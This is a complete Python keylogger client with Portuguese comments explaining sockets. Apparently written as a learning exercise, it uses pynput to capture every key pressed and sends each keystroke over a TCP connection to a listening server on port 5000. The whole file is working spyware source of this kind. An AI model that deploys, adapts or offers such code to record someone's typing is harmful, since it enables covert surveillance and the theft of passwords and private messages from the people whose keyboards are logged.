import socket
from pynput import keyboard


HOST = socket.gethostname()
# o host irá receber a conexão para encontrar o servidor

PORTA = 5000
# Usando a mesma analogia do server, a porta é por onde de fato os pacotes "entram" no servidor ou seja
# é necessário que seja a mesma porta para que ocorra a comunicação e troca de dados

client_socket = socket.socket()
# Instância do objeto do tipo socket no formatto TCP/IP

client_socket.connect((HOST, PORTA))
# a fução connect estabele a conexão com o servidor
# Quando a connect (conexão) foi estabelecida, o soquete pode ser utilizado para enviar uma solicitação de
# texto para o servidor. O mesmo soquete é que irá ler a resposta.


def on_press(key):

    try:
        keydata = str(key)
        client_socket.send(keydata.encode())

    except AttributeError:
        print(f'Tecla especial {key} foi  pressionada')
        if (str(key) != "Key.backspace") and (str(key) != "Key.space") and (str(key) != "Key.esc"):
            pass
        else:
            # Que faz o envio do dado para servidor
            client_socket.send(keydata.encode())


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()




